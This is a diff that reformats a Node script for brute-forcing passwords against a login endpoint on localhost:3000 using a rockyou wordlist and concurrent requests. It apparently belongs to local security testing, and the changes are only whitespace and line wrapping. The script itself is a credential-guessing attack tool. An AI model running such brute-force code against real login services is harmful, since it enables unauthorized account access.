@@ -4,7 +4,7 @@ import readline from "readline";
 const TARGET_URL = "http://localhost:3000/login";
 const username = process.argv[2] ?? "alice";
 const wordlistPath = process.argv[3] ?? "/usr/share/wordlists/rockyou-50.txt";
-const CONCURRENCY = 10; 
+const CONCURRENCY = 10;
 
 async function tryPassword(password) {
   const res = await fetch(TARGET_URL, {
@@ -46,7 +46,9 @@ async function bruteForce() {
       const found = results.find((r) => r.success);
       if (found) {
         const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-        console.log(`\n✅ PASSWORD FOUND after ${attempted} attempts (${elapsed}s)`);
+        console.log(
+          `\n✅ PASSWORD FOUND after ${attempted} attempts (${elapsed}s)`,
+        );
         console.log(`   Username : ${username}`);
         console.log(`   Password : ${found.password}`);
         process.exit(0);
@@ -63,7 +65,9 @@ async function bruteForce() {
     attempted += results.length;
     const found = results.find((r) => r.success);
     if (found) {
-      console.log(`\n✅ PASSWORD FOUND: ${found.password} (after ${attempted} attempts)`);
+      console.log(
+        `\n✅ PASSWORD FOUND: ${found.password} (after ${attempted} attempts)`,
+      );
       process.exit(0);
     }
   }
